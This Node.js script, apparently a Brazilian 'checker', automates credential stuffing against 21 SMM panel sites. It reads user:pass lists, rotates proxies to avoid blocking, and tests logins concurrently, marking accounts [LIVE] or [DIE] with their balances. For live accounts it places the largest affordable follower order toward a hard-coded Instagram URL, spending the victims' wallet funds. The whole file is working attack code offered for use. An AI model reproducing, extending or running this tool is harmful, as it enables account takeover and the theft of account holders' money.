const fs = require("fs/promises");
const readline = require("readline");
const path = require("path");
const {
  MIN_BALANCE,
  getPanelConfig,
  costForFollowers,
  maxFollowersForBalance,
  getOrderBalanceBuffer,
  clampOrderQuantityToBalance,
  instagramTargetUrl,
  minOrderBalanceInWallet,
  canEstimateFollowers,
  resolvePricePer1000InWallet,
} = require("./config");
const { formatBalanceDisplay, UNKNOWN: WALLET_UNKNOWN } = require("./Apis/_currency");

const PANEL_IDS = [
  "baratosociais",
  "crescitaly",
  "engajamais",
  "fabricadeseguidores",
  "instabarato",
  "machinesmm",
  "smm-center",
  "smmhype",
  "smmoficial",
  "verifiedatacado",
  "smmpremium",
  "smmja",
  "smmist",
  "worldofsmm",
  "bestsmm",
  "fontesmm",
  "fullsmm",
  "smmnet",
  "smmgo",
  "cheapestsmmpanels",
  "smmfollowom",
];

const THREADS = 4;

async function runPool(items, concurrency, worker) {
  let next = 0;
  const n = items.length;
  const workers = Math.min(Math.max(1, concurrency), n || 1);
  async function take() {
    while (next < n) {
      const i = next;
      next += 1;
      await worker(items[i], i);
    }
  }
  await Promise.all(Array.from({ length: workers }, () => take()));
}

const ansi = {
  reset: "\x1b[0m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  blue: "\x1b[34m",
  yellow: "\x1b[33m",
};

function useAnsi() {
  if (process.env.NO_COLOR) return false;
  if (process.env.FORCE_COLOR === "1" || process.env.FORCE_COLOR === "true")
    return true;
  return Boolean(process.stdout.isTTY);
}

function paint(text, color) {
  if (!useAnsi()) return text;
  const c = ansi[color];
  return c ? `${c}${text}${ansi.reset}` : text;
}

function createRl() {
  return readline.createInterface({ input: process.stdin, output: process.stdout });
}

function question(rl, text) {
  return new Promise((resolve) => {
    rl.question(text, resolve);
  });
}

function readAllStdinBuffer() {
  return new Promise((resolve, reject) => {
    const chunks = [];
    process.stdin.on("data", (c) => chunks.push(c));
    process.stdin.on("end", () => resolve(Buffer.concat(chunks)));
    process.stdin.on("error", reject);
    process.stdin.resume();
  });
}

async function readPipedChoice() {
  const buf = await readAllStdinBuffer();
  const raw = buf.toString("utf8");
  const line = raw.split(/\r?\n/)[0] ?? "";
  return Number.parseInt(String(line).trim(), 10);
}

function parseUserPass(line) {
  const t = line.trim();
  if (!t) return null;
  const i = t.indexOf(":");
  if (i <= 0) return null;
  return { user: t.slice(0, i), pass: t.slice(i + 1) };
}

async function loadLines(contasPath) {
  const raw = await fs.readFile(contasPath, "utf8");
  return raw.split(/\r?\n/);
}

function loadPanelModule(panelId) {
  const modPath = path.join(__dirname, "Apis", `${panelId}.js`);
  return require(modPath);
}

async function main() {
  const usePipe =
    process.argv.includes("--pipe") || !process.stdin.isTTY;

  PANEL_IDS.forEach((id, idx) => {
    const mod = loadPanelModule(id);
    console.log(`  ${idx + 1}) ${mod.label} (${id})`);
  });

  let choice;
  if (!usePipe) {
    const rl = createRl();
    try {
      const choiceRaw = await question(rl, "\nNúmero do painel: ");
      choice = Number.parseInt(String(choiceRaw).trim(), 10);
    } finally {
      try {
        rl.close();
      } catch {
        /* noop */
      }
    }
  } else {
    choice = await readPipedChoice();
  }

  if (!Number.isFinite(choice) || choice < 1 || choice > PANEL_IDS.length) {
    console.error("Opção inválida.");
    process.exitCode = 1;
    return;
  }

  const panelId = PANEL_IDS[choice - 1];
  const panelMod = loadPanelModule(panelId);
  const cfg = getPanelConfig(panelId);
  if (!cfg) {
    console.error("Config do painel não encontrada.");
    process.exitCode = 1;
    return;
  }

  let lines;
  try {
    lines = await loadLines(cfg.contasFile);
  } catch (e) {
    console.error(`Não foi possível ler ${cfg.contasFile}`);
    console.error(String(e && e.message ? e.message : e));
    process.exitCode = 1;
    return;
  }

  const entries = lines.map(parseUserPass).filter(Boolean);
  if (entries.length === 0) {
    console.log(`Nenhuma linha user:pass em ${cfg.contasFile}`);
    return;
  }

  const proxyPool = require("./proxyPool");
  const proxyCount = await proxyPool.initProxyPool();
  if (proxyPool.envProxyUrl()) {
    console.log(`Proxy: HTTP(S)_PROXY → ${proxyPool.envProxyUrl()}`);
  } else if (proxyCount > 0) {
    console.log(`Proxy: ${proxyCount} linhas em proxys.txt (rotação).`);
  }

  async function processEntry({ user, pass }) {
    const retainSessionForOrder =
      typeof panelMod.createOrder === "function" &&
      typeof panelMod.loginAndCreateOrder === "function";
    const res = await panelMod.checkAccount(
      user,
      pass,
      retainSessionForOrder ? { retainSession: true } : {},
    );
    const walletCur = res.ok && res.currency ? res.currency : null;
    const price = walletCur ? resolvePricePer1000InWallet(cfg, walletCur) : null;
    const comparable =
      res.ok &&
      res.balance != null &&
      walletCur != null &&
      canEstimateFollowers(cfg, walletCur);
    const buf = getOrderBalanceBuffer(cfg);
    const maxF =
      comparable && price != null
        ? maxFollowersForBalance(price, res.balance, buf)
        : null;
    const minQPedido = cfg.orderMinQuantity ?? 1;
    const qPedido =
      comparable && price != null && maxF != null
        ? clampOrderQuantityToBalance(price, res.balance, maxF, minQPedido)
        : null;
    const custoMax =
      qPedido != null && price != null
        ? costForFollowers(price, qPedido)
        : null;

    if (!res.ok) {
      console.log(
        paint(
          `[DIE] ${user} — ${res.error ?? "login/saldo indisponível"}`,
          "red",
        ),
      );
      return;
    }

    const bal = res.balance;
    if (bal == null || Number.isNaN(bal)) {
      console.log(paint(`[DIE] ${user} — saldo não retornado`, "red"));
      return;
    }

    if (bal < MIN_BALANCE) {
      console.log(
        paint(
          `[LIVE] ${user} — saldo: ${formatBalanceDisplay(bal, res.currency)}`,
          "green",
        ),
      );
    }

    if (bal >= MIN_BALANCE) {
      console.log(
        paint(
          `[LIVE] ${user} — saldo: ${formatBalanceDisplay(bal, res.currency)}`,
          "green",
        ),
      );
    }
    if (
      res.ok &&
      price != null &&
      walletCur != null &&
      !canEstimateFollowers(cfg, walletCur)
    ) {
      const pc = cfg.pricePer1000Currency ?? "USD";
      if (walletCur === WALLET_UNKNOWN) {
      } else {
      }
    } else if (price == null) {
      console.log(
        `  Defina pricePer1000 em config.js para ver estimativa de seguidores.`,
      );
    }

    if (
      typeof panelMod.loginAndCreateOrder === "function" &&
      walletCur != null &&
      price != null &&
      canEstimateFollowers(cfg, walletCur)
    ) {
      const minPedido = minOrderBalanceInWallet(cfg, walletCur);
      if (
        minPedido == null ||
        bal < minPedido ||
        qPedido == null ||
        qPedido < minQPedido
      ) {
        return;
      }
      const q = qPedido;
      const orderRes =
        res.jar && typeof panelMod.createOrder === "function"
          ? await panelMod.createOrder(res.jar, {
              link: instagramTargetUrl,
              quantity: q,
            })
          : await panelMod.loginAndCreateOrder(user, pass, {
              link: instagramTargetUrl,
              quantity: q,
            });
      if (orderRes.ok) {
        console.log(
          paint(
            `[PEDIDO] ${q} — ${instagramTargetUrl}`,
            "blue",
          ),
        );
      } else {
        const det = orderRes.error ?? orderRes.bodySnippet ?? "resposta inesperada";
        const custo = costForFollowers(price, q);
        console.log(
          paint(
            `[PEDIDO] ${det} — q=${q} custo≈${custo != null ? custo.toFixed(6) : "?"} saldo=${bal} — ${instagramTargetUrl}`,
            "blue",
          ),
        );
      }
    }
  }

  await runPool(entries, THREADS, processEntry);
}

main().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
